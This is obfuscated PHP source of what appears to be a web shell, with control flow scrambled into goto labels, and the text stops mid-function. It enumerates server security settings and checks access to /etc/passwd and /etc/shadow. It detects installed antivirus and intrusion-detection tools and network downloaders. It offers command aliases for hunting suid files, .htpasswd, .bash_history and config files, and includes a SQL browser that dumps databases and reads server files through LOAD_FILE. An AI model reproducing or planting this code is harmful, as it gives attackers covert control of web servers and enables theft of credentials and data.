<?php
goto bece7;
a8067:
function actionSecInfo()
{
    goto e6291;
    bf3f9:
    $temp = array();
    goto b8a9c;
    d3a79:
    function yUoJQSecParam($n, $v)
    {
        $v = trim($v);
        if ($v) {
            echo '<span>' . $n . ': </span>';
            if (strpos($v, "\n") === false) {
                echo $v . '<br>';
            } else {
                echo '<pre class=ml1>' . $v . '</pre>';
            }
        }
    }
    goto bcb92;
    e6291:
    yUoJQHeader();
    goto b89a8;
    ce320:
    if (function_exists('oci_connect')) {
        $temp[] = "Oracle";
    }
    goto b2686;
    f0e49:
    yUoJQSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    goto D2b4e;
    f16ed:
    yUoJQSecParam('Disabled PHP Functions', $GLOBALS['disable_functions'] ? $GLOBALS['disable_functions'] : 'none');
    goto e166b;
    bcb92:
    yUoJQSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    goto Efe4f;
    b2686:
    yUoJQSecParam('Supported databases', implode(', ', $temp));
    goto C53a0;
    b8a9c:
    if (function_exists('mysql_get_client_info')) {
        $temp[] = "MySql (" . mysql_get_client_info() . ")";
    }
    goto e526a;
    Efe4f:
    if (function_exists('apache_get_modules')) {
        yUoJQSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
    }
    goto f16ed;
    b89a8:
    echo '<h1>Server security information</h1><div class=content>';
    goto d3a79;
    a21cf:
    if (function_exists('pg_connect')) {
        $temp[] = "PostgreSQL";
    }
    goto ce320;
    e4f22:
    yUoJQFooter();
    goto E2183;
    e526a:
    if (function_exists('mssql_connect')) {
        $temp[] = "MSSQL";
    }
    goto a21cf;
    C53a0:
    echo '<br>';
    goto fdc10;
    a8e15:
    echo '</div>';
    goto e4f22;
    fdc10:
    if ($GLOBALS['os'] == 'nix') {
        goto E8682;
        a4083:
        yUoJQSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>" : 'no');
        goto C1dc5;
        A6547:
        yUoJQSecParam('Distr name', @file_get_contents('/etc/issue.net'));
        goto f5537;
        f5537:
        if (!$GLOBALS['safe_mode']) {
            goto Fa030;
            B2506:
            $temp = array();
            goto cbb00;
            e2f0d:
            Aef40:
            goto ebf54;
            Ce784:
            E4eeb:
            goto Ec41d;
            C8b8a:
            $temp = array();
            goto A325d;
            Fb300:
            ac647:
            goto C2487;
            e8941:
            yUoJQSecParam('Hosts', @file_get_contents('/etc/hosts'));
            goto aa307;
            C2487:
            yUoJQSecParam('Userful', implode(', ', $temp));
            goto C8b8a;
            f9804:
            $temp = array();
            goto Fa96e;
            a446e:
            $downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
            goto f8462;
            cbb00:
            foreach ($userful as $item) {
                if (yUoJQWhich($item)) {
                    $temp[] = $item;
                }
                ea88d:
            }
            goto Fb300;
            Edc2e:
            yUoJQSecParam('HDD space', yUoJQEx('df -h'));
            goto e8941;
            d2a60:
            if (isset($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
                goto c8c41;
                Fbf3f:
                goto A44de;
                goto ef434;
                b4479:
                yUoJQSecParam('Users', $temp);
                goto c525f;
                ef434:
                B6b7b:
                goto F44b9;
                b0390:
                if (!($_POST['p2'] <= $_POST['p3'])) {
                    goto B6b7b;
                }
                goto A895f;
                F44b9:
                echo '<br/>';
                goto b4479;
                c8c41:
                $temp = "";
                goto b2323;
                A895f:
                $uid = @posix_getpwuid($_POST['p2']);
                goto D8f24;
                D6849:
                $_POST['p2']++;
                goto Fbf3f;
                b2323:
                A44de:
                goto b0390;
                D8f24:
                if ($uid) {
                    $temp .= join(':', $uid) . "\n";
                }
                goto be2ad;
                be2ad:
                E9861:
                goto D6849;
                c525f:
            }
            goto Ce554;
            f8462:
            echo '<br>';
            goto B2506;
            Ec41d:
            yUoJQSecParam('Downloaders', implode(', ', $temp));
            goto Fdeab;
            E1bb3:
            $danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
            goto a446e;
            ebf54:
            yUoJQSecParam('Danger', implode(', ', $temp));
            goto f9804;
            aa307:
            echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
            goto d2a60;
            Fdeab:
            echo '<br/>';
            goto Edc2e;
            A325d:
            foreach ($danger as $item) {
                if (yUoJQWhich($item)) {
                    $temp[] = $item;
                }
                d2341:
            }
            goto e2f0d;
            Fa030:
            $userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
            goto E1bb3;
            Fa96e:
            foreach ($downloaders as $item) {
                if (yUoJQWhich($item)) {
                    $temp[] = $item;
                }
                c8b65:
            }
            goto Ce784;
            Ce554:
        }
        goto Aa608;
        E8682:
        yUoJQSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
        goto a4083;
        C1dc5:
        yUoJQSecParam('OS version', @file_get_contents('/proc/version'));
        goto A6547;
        Aa608:
    } else {
        goto fae8b;
        F0ed6:
        yUoJQSecParam('Account Settings', yUoJQEx('net accounts'));
        goto Ca5b9;
        Ca5b9:
        yUoJQSecParam('User Accounts', yUoJQEx('net user'));
        goto c76e3;
        fae8b:
        yUoJQSecParam('OS Version', yUoJQEx('ver'));
        goto F0ed6;
        c76e3:
    }
    goto a8e15;
    D2b4e:
    yUoJQSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
    goto bf3f9;
    e166b:
    yUoJQSecParam('Open base dir', @ini_get('open_basedir'));
    goto a0a9e;
    a0a9e:
    yUoJQSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    goto f0e49;
    E2183:
}
goto Ef782;
A115f:
$safe_mode = @ini_get('safe_mode');
goto def8d;
f7b97:
if (isset($_POST['c'])) {
    @chdir($_POST['c']);
}
goto C2065;
ff23d:
if (empty($_POST['a'])) {
    if (isset($default_action) && function_exists('action' . $default_action)) {
        $_POST['a'] = $default_action;
    } else {
        $_POST['a'] = 'SecInfo';
    }
}
goto b4587;
df897:
if (!function_exists("posix_getgrgid") && strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false) {
    function posix_getgrgid($p)
    {
        return false;
    }
}
goto e6f70;
Db4fc:
if ($os == 'win') {
    $aliases = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");
} else {
    $aliases = array("List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
}
goto D650f;
E4721:
if ($os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
goto Ee88b;
A3985:
function actionSql()
{
    goto b5ed4;
    ea77b:
    $tmp = "<input type=text name=sql_base value=''>";
    goto ab9b8;
    b027a:
    if (@$_POST['p2'] == 'download' && @$_POST['p1'] != 'select') {
        goto b6fec;
        d1fec:
        switch ($_POST['charset']) {
            case "Windows-1251":
                $db->setCharset('cp1251');
                goto b1eb5;
            case "UTF-8":
                $db->setCharset('utf8');
                goto b1eb5;
            case "KOI8-R":
                $db->setCharset('koi8r');
                goto b1eb5;
            case "KOI8-U":
                $db->setCharset('koi8u');
                goto b1eb5;
            case "cp866":
                $db->setCharset('cp866');
                goto b1eb5;
        }
        goto affdd;
        Ffb67:
        if (empty($_POST['file'])) {
            goto D622a;
            cf3a1:
            foreach ($_POST['tbl'] as $v) {
                $db->dump($v);
                ab0af:
            }
            goto a8da3;
            D622a:
            ob_start("ob_gzhandler", 4096);
            goto f3a94;
            d5854:
            exit;
            goto aae74;
            f3a94:
            header("Content-Disposition: attachment; filename=dump.sql");
            goto Fe35f;
            a8da3:
            A33d3:
            goto d5854;
            Fe35f:
            header("Content-Type: text/plain");
            goto cf3a1;
            aae74:
        } elseif ($fp = @fopen($_POST['file'], 'w')) {
            goto a0a41;
            a0a41:
            foreach ($_POST['tbl'] as $v) {
                $db->dump($v, $fp);
                Ef0ca:
            }
            goto e6b90;
            e6b90:
            F1ab9:
            goto Fe42d;
            E8242:
            unset($_POST['p2']);
            goto e818d;
            Fe42d:
            fclose($fp);
            goto E8242;
            e818d:
        } else {
            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
        }
        goto cbe5d;
        Fba39:
        $db->selectdb($_POST['sql_base']);
        goto d1fec;
        b6fec:
        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
        goto Fba39;
        affdd:
        Be3f0:
        goto e2b7f;
        e2b7f:
        b1eb5:
        goto Ffb67;
        cbe5d:
    }
    goto F4c70;
    B333f:
    echo '</div>';
    goto d7118;
    Ec908:
    echo "</td>\r\n\t\t\t\t<td><input type=submit value='>>' onclick='fs(d.sf);'></td>\r\n                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>\r\n\t\t\t</tr>\r\n\t\t</table>\r\n\t\t<script>\r\n            s_db='" . @addslashes($_POST['sql_base']) . "';\r\n            function fs(f) {\r\n                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};\r\n                    if(f.p1) f.p1.value='';\r\n                    if(f.p2) f.p2.value='';\r\n                    if(f.p3) f.p3.value='';\r\n                }\r\n            }\r\n\t\t\tfunction st(t,l) {\r\n\t\t\t\td.sf.p1.value = 'select';\r\n\t\t\t\td.sf.p2.value = t;\r\n                if(l && d.sf.p3) d.sf.p3.value = l;\r\n\t\t\t\td.sf.submit();\r\n\t\t\t}\r\n\t\t\tfunction is() {\r\n\t\t\t\tfor(i=0;i<d.sf.elements['tbl[]'].length;++i)\r\n\t\t\t\t\td.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;\r\n\t\t\t}\r\n\t\t</script>";
    goto f2e0a;
    fd1ce:
    $db = new DbClass($_POST['type']);
    goto b027a;
    ab9b8:
    if (isset($_POST['sql_host'])) {
        if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
            goto Ec102;
            fa861:
            goto E010b;
            goto ce054;
            Ec102:
            switch ($_POST['charset']) {
                case "Windows-1251":
                    $db->setCharset('cp1251');
                    goto e3ef2;
                case "UTF-8":
                    $db->setCharset('utf8');
                    goto e3ef2;
                case "KOI8-R":
                    $db->setCharset('koi8r');
                    goto e3ef2;
                case "KOI8-U":
                    $db->setCharset('koi8u');
                    goto e3ef2;
                case "cp866":
                    $db->setCharset('cp866');
                    goto e3ef2;
            }
            goto bca65;
            c0f22:
            echo "<select name=sql_base><option value=''></option>";
            goto cf019;
            D4959:
            echo '</select>';
            goto Af2a5;
            C066e:
            e3ef2:
            goto D6319;
            ce054:
            D674e:
            goto D4959;
            cf019:
            E010b:
            goto A00fa;
            f6e89:
            echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
            goto fa861;
            bca65:
            Ff48b:
            goto C066e;
            A00fa:
            if (!($item = $db->fetch())) {
                goto D674e;
            }
            goto B57da;
            B57da:
            list($key, $value) = each($item);
            goto f6e89;
            D6319:
            $db->listDbs();
            goto c0f22;
            Af2a5:
        } else {
            echo $tmp;
        }
    } else {
        echo $tmp;
    }
    goto Ec908;
    A3473:
    echo "\r\n<h1>Sql browser</h1><div class=content>\r\n<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>\r\n<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>\r\n<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n<td><select name='type'><option value='mysql' ";
    goto b21d3;
    D3308:
    echo ">MySql</option><option value='pgsql' ";
    goto Cf388;
    b5ed4:
    class DbClass
    {
        var $type;
        var $link;
        var $res;
        function __construct($type)
        {
            $this->type = $type;
        }
        function connect($host, $user, $pass, $dbname)
        {
            goto d43d3;
            F6936:
            c2208:
            goto Ab59b;
            d43d3:
            switch ($this->type) {
                case 'mysql':
                    if ($this->link = @mysql_connect($host, $user, $pass, true)) {
                        return true;
                    }
                    goto c2208;
                case 'pgsql':
                    goto f2089;
                    f204d:
                    if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user={$user} password={$pass} dbname={$dbname}")) {
                        return true;
                    }
                    goto Ee7c6;
                    Aad53:
                    if (!$host[1]) {
                        $host[1] = 5432;
                    }
                    goto f204d;
                    f2089:
                    $host = explode(':', $host);
                    goto Aad53;
                    Ee7c6:
                    goto c2208;
                    goto C42ce;
                    C42ce:
            }
            goto Ba1de;
            Ba1de:
            F61f3:
            goto F6936;
            Ab59b:
            return false;
            goto c4ca1;
            c4ca1:
        }
        function selectdb($db)
        {
            goto dbf2b;
            D0fbe:
            b62b6:
            goto eda80;
            eda80:
            Bd98a:
            goto a7d24;
            dbf2b:
            switch ($this->type) {
                case 'mysql':
                    if (@mysql_select_db($db)) {
                        return true;
                    }
                    goto Bd98a;
            }
            goto D0fbe;
            a7d24:
            return false;
            goto b0068;
            b0068:
        }
        function query($str)
        {
            goto A4cea;
            a54ed:
            return false;
            goto F94da;
            A4cea:
            switch ($this->type) {
                case 'mysql':
                    return $this->res = @mysql_query($str);
                    goto e65ba;
                case 'pgsql':
                    return $this->res = @pg_query($this->link, $str);
                    goto e65ba;
            }
            goto a6c8f;
            a6c8f:
            f6cc4:
            goto Aed58;
            Aed58:
            e65ba:
            goto a54ed;
            F94da:
        }
        function fetch()
        {
            goto a99ad;
            f7f60:
            bef0d:
            goto A0b34;
            A0b34:
            return false;
            goto e833a;
            bb9eb:
            switch ($this->type) {
                case 'mysql':
                    return @mysql_fetch_assoc($res);
                    goto bef0d;
                case 'pgsql':
                    return @pg_fetch_assoc($res);
                    goto bef0d;
            }
            goto Fa1d4;
            a99ad:
            $res = func_num_args() ? func_get_arg(0) : $this->res;
            goto bb9eb;
            Fa1d4:
            e52ea:
            goto f7f60;
            e833a:
        }
        function listDbs()
        {
            goto E4fc9;
            E4fc9:
            switch ($this->type) {
                case 'mysql':
                    return $this->query("SHOW databases");
                    goto E6f90;
                case 'pgsql':
                    return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
                    goto E6f90;
            }
            goto ef6e6;
            A10ba:
            return false;
            goto a2dc7;
            ef6e6:
            bd22d:
            goto fcd65;
            fcd65:
            E6f90:
            goto A10ba;
            a2dc7:
        }
        function listTables()
        {
            goto Dc439;
            Ad13d:
            E6a74:
            goto bbf24;
            E1baa:
            d308f:
            goto Ad13d;
            Dc439:
            switch ($this->type) {
                case 'mysql':
                    return $this->res = $this->query('SHOW TABLES');
                    goto E6a74;
                case 'pgsql':
                    return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
                    goto E6a74;
            }
            goto E1baa;
            bbf24:
            return false;
            goto a8003;
            a8003:
        }
        function error()
        {
            goto ed2d4;
            D510c:
            return false;
            goto B3d25;
            Da56e:
            B2e0f:
            goto a15dc;
            ed2d4:
            switch ($this->type) {
                case 'mysql':
                    return @mysql_error();
                    goto A688f;
                case 'pgsql':
                    return @pg_last_error();
                    goto A688f;
            }
            goto Da56e;
            a15dc:
            A688f:
            goto D510c;
            B3d25:
        }
        function setCharset($str)
        {
            goto ec13d;
            ec13d:
            switch ($this->type) {
                case 'mysql':
                    if (function_exists('mysql_set_charset')) {
                        return @mysql_set_charset($str, $this->link);
                    } else {
                        $this->query('SET CHARSET ' . $str);
                    }
                    goto C8c95;
                case 'pgsql':
                    return @pg_set_client_encoding($this->link, $str);
                    goto C8c95;
            }
            goto E58b8;
            fdd3f:
            return false;
            goto f451c;
            E58b8:
            d4bec:
            goto b8558;
            b8558:
            C8c95:
            goto fdd3f;
            f451c:
        }
        function loadFile($str)
        {
            goto bb612;
            dfb35:
            return false;
            goto c29f8;
            e84b8:
            C01d8:
            goto E0525;
            E0525:
            Eb0aa:
            goto dfb35;
            bb612:
            switch ($this->type) {
                case 'mysql':
                    return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
                    goto Eb0aa;
                case 'pgsql':
                    goto Bd457;
                    Bf4a3:
                    E9275:
                    goto Fdca6;
                    b5265:
                    if (!($i = $this->fetch())) {
                        goto E9275;
                    }
                    goto Ee557;
                    Bd457:
                    $this->query("CREATE TABLE yUoJQ2(file text);COPY yUoJQ2 FROM '" . addslashes($str) . "';select file from yUoJQ2;");
                    goto Ac28b;
                    Ac28b:
                    $r = array();
                    goto Abb09;
                    Abb09:
                    cc44b:
                    goto b5265;
                    Ede8a:
                    goto Eb0aa;
                    goto a2984;
                    a4d21:
                    return array('file' => implode("\n", $r));
                    goto Ede8a;
                    f0e83:
                    goto cc44b;
                    goto Bf4a3;
                    Fdca6:
                    $this->query('drop table yUoJQ2');
                    goto a4d21;
                    Ee557:
                    $r[] = $i['file'];
                    goto f0e83;
                    a2984:
            }
            goto e84b8;
            c29f8:
        }
        function dump($table, $fp = false)
        {
            goto F1956;
            de65f:
            b2b46:
            goto ad13e;
            Ce345:
            e0488:
            goto de65f;
            ad13e:
            return false;
            goto F633d;
            F1956:
            switch ($this->type) {
                case 'mysql':
                    goto b4af8;
                    da14f:
                    aff08:
                    goto cd298;
                    ec5d4:
                    if (!$head) {
                        if ($fp) {
                            fwrite($fp, ";\n\n");
                        } else {
                            echo ";\n\n";
                        }
                    }
                    goto Ec173;
                    Eb193:
                    bbdd9:
                    goto C5710;
                    b4db8:
                    goto bbdd9;
                    goto Dd6d6;
                    E27a4:
                    $sql = $create[1] . ";\n";
                    goto af2fa;
                    cd298:
                    if ($head) {
                        $sql .= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $item) . ')';
                        $head = false;
                    } else {
                        $sql .= "\n\t,(" . implode(", ", $item) . ')';
                    }
                    goto E8c06;
                    Ece58:
                    $columns = array();
                    goto B065b;
                    E8c06:
                    if ($fp) {
                        fwrite($fp, $sql);
                    } else {
                        echo $sql;
                    }
                    goto c4f1c;
                    eb431:
                    if ($i % 1000 == 0) {
                        $head = true;
                        $sql = ";\n\n";
                    }
                    goto Ece58;
                    Dd6d6:
                    C6a53:
                    goto ec5d4;
                    e4f69:
                    $this->query('SELECT * FROM `' . $table . '`');
                    goto E5827;
                    C5710:
                    if (!($item = $this->fetch())) {
                        goto C6a53;
                    }
                    goto b29de;
                    c4f1c:
                    $i++;
                    goto b4db8;
                    e6276:
                    $create = mysql_fetch_array($res);
                    goto E27a4;
                    af2fa:
                    if ($fp) {
                        fwrite($fp, $sql);
                    } else {
                        echo $sql;
                    }
                    goto e4f69;
                    B065b:
                    foreach ($item as $k => $v) {
                        goto eb6e8;
                        Be48b:
                        E5d92:
                        goto f39d1;
                        fa1e4:
                        $columns[] = "`" . $k . "`";
                        goto Be48b;
                        eb6e8:
                        if ($v === null) {
                            $item[$k] = "NULL";
                        } elseif (is_int($v)) {
                            $item[$k] = $v;
                        } else {
                            $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
                        }
                        goto fa1e4;
                        f39d1:
                    }
                    goto da14f;
                    b29de:
                    $sql = '';
                    goto eb431;
                    b4af8:
                    $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
                    goto e6276;
                    B76ad:
                    $head = true;
                    goto Eb193;
                    Ec173:
                    goto b2b46;
                    goto bf863;
                    E5827:
                    $i = 0;
                    goto B76ad;
                    bf863:
                case 'pgsql':
                    goto e74f6;
                    A53ea:
                    goto b2b46;
                    goto Bd2d7;
                    d1bf8:
                    $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "\n";
                    goto E0420;
                    e74f6:
                    $this->query('SELECT * FROM ' . $table);
                    goto C69a1;
                    Ae7f1:
                    if (!($item = $this->fetch())) {
                        goto d3a26;
                    }
                    goto Eb625;
                    f6b04:
                    d3a26:
                    goto A53ea;
                    C69a1:
                    abea3:
                    goto Ae7f1;
                    ab50d:
                    goto abea3;
                    goto f6b04;
                    E0420:
                    if ($fp) {
                        fwrite($fp, $sql);
                    } else {
                        echo $sql;
                    }
                    goto ab50d;
                    Eb625:
                    $columns = array();
                    goto ac1da;
                    ac1da:
                    foreach ($item as $k => $v) {
                        goto Be8b0;
                        f3769:
                        d77cf:
                        goto e557f;
                        f039e:
                        $columns[] = $k;
                        goto f3769;
                        Be8b0:
                        $item[$k] = "'" . addslashes($v) . "'";
                        goto f039e;
                        e557f:
                    }
                    goto C75f8;
                    C75f8:
                    d5dfa:
                    goto d1bf8;
                    Bd2d7:
            }
            goto Ce345;
            F633d:
        }
    }
    goto fd1ce;
    Cf388:
    if (@$_POST['type'] == 'pgsql') {
        echo 'selected';
    }
    goto B8f89;
    f2e0a:
    if (isset($db) && $db->link) {
        goto Ddd1e;
        c82dd:
        if (!empty($_POST['sql_base'])) {
            goto D41c6;
            E50c0:
            e56e4:
            goto A236a;
            dfbce:
            echo "</textarea><br/><input type=submit value='Execute'>";
            goto be02b;
            C292d:
            $tbls_res = $db->listTables();
            goto E50c0;
            be02b:
            echo "</td></tr>";
            goto Ecde6;
            A236a:
            if (!($item = $db->fetch($tbls_res))) {
                goto a6f32;
            }
            goto c6c1d;
            ba19b:
            echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
            goto Cae1e;
            D41c6:
            $db->selectdb($_POST['sql_base']);
            goto F1453;
            c6c1d:
            list($key, $value) = each($item);
            goto D0bff;
            Bd0f2:
            if (!empty($_POST['p2']) && $_POST['p1'] != 'loadfile') {
                echo htmlspecialchars($_POST['p2']);
            }
            goto dfbce;
            Caf24:
            echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
            goto Fc73a;
            a4dae:
            a6f32:
            goto ba19b;
            F3b53:
            if (@$_POST['p1'] == 'query' && !empty($_POST['p2'])) {
                $db->query(@$_POST['p2']);
                if ($db->res !== false) {
                    goto Fc9bd;
                    C9c6f:
                    foreach ($item as $key => $value) {
                        if ($value == null) {
                            echo '<td><i>null</i></td>';
                        } else {
                            echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
                        }
                        Ed31b:
                    }
                    goto Cb498;
                    Fc9bd:
                    $title = false;
                    goto ad6e8;
                    Cb498:
                    B323b:
                    goto Bbe13;
                    f0a27:
                    goto F2eb9;
                    goto da611;
                    Bbe13:
                    echo '</tr>';
                    goto f0a27;
                    A2636:
                    echo '<tr class="l' . $line . '">';
                    goto c933a;
                    c933a:
                    $line = $line == 1 ? 2 : 1;
                    goto C9c6f;
                    D2497:
                    if (!$title) {
                        goto b0c38;
                        a31d5:
                        $title = true;
                        goto F6ec4;
                        F6ec4:
                        echo '</tr><tr>';
                        goto F82fc;
                        F82fc:
                        $line = 2;
                        goto fc942;
                        ba415:
                        foreach ($item as $key => $value) {
                            echo '<th>' . $key . '</th>';
                            E0a16:
                        }
                        goto c3e4b;
                        f8866:
                        reset($item);
                        goto a31d5;
                        c3e4b:
                        C8464:
                        goto f8866;
                        b0c38:
                        echo '<tr>';
                        goto ba415;
                        fc942:
                    }
                    goto A2636;
                    f15f9:
                    $line = 1;
                    goto B73eb;
                    ad6e8:
                    echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
                    goto f15f9;
                    d73bc:
                    echo '</table>';
                    goto beaa3;
                    B73eb:
                    F2eb9:
                    goto cdd98;
                    da611:
                    dc38e:
                    goto d73bc;
                    cdd98:
                    if (!($item = $db->fetch())) {
                        goto dc38e;
                    }
                    goto D2497;
                    beaa3:
                } else {
                    echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
                }
            }
            goto c5731;
            D0bff:
            if (!empty($_POST['sql_count'])) {
                $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
            }
            goto F5914;
            Cae1e:
            if (@$_POST['p1'] == 'select') {
                goto ab74d;
                Fd3b7:
                $num = $db->fetch();
                goto Aecf8;
                Aecf8:
                $pages = ceil($num['n'] / 30);
                goto ce26c;
                fa988:
                $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
                goto Fd3b7;
                Efaad:
                if ($_POST['p3'] > 1) {
                    echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>&lt; Prev</a>";
                }
                goto c716b;
                a3c50:
                $_POST['p3']--;
                goto aca1d;
                ce26c:
                echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . (int) $_POST['p3'] . ">";
                goto C9bbe;
                D955d:
                $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
                goto fa988;
                c716b:
                if ($_POST['p3'] < $pages) {
                    echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next &gt;</a>";
                }
                goto a3c50;
                aca1d:
                if ($_POST['type'] == 'pgsql') {
                    $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . $_POST['p3'] * 30;
                } else {
                    $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . $_POST['p3'] * 30 . ',30';
                }
                goto ecbc0;
                ab74d:
                $_POST['p1'] = 'query';
                goto D955d;
                C9bbe:
                echo " of {$pages}";
                goto Efaad;
                ecbc0:
                echo "<br><br>";
                goto c5688;
                c5688:
            }
            goto F3b53;
            Fc73a:
            goto e56e4;
            goto a4dae;
            c5731:
            echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
            goto Bd0f2;
            F1453:
            echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
            goto C292d;
            F5914:
            $value = htmlspecialchars($value);
            goto Caf24;
            Ecde6:
        }
        goto f310f;
        f310f:
        echo "</table></form><br/>";
        goto C918e;
        C918e:
        if ($_POST['type'] == 'mysql') {
            $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
            if ($db->fetch()) {
                echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
